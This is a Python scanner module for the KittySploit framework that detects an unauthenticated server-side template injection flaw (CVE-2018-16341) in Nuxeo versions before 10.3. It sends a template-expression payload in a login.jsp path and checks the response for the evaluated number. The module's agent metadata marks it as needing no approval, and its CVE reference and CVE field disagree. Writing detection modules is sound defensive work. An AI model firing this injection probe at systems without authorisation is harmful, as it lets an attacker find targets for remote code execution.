#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Nuxeo prior to version 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nuxeo <10.3 - Remote Code Execution Detection',
        'description': 'Nuxeo prior to version 10.3 is susceptible to an unauthenticated remote code execution vulnerability via server-side template injection.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'nuxeo', 'ssti', 'rce', 'bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2018-16299'],
        'cve': 'CVE-2018-16341',
    }

    def run(self):
        r = self.http_request(method="GET", path='/nuxeo/login.jsp/pwn${31333333330+7}.xhtml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('31333333337',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Nuxeo <10.3 - Remote Code Execution detected",
                path='/nuxeo/login.jsp/pwn${31333333330+7}.xhtml',
            )
            return True
        return False

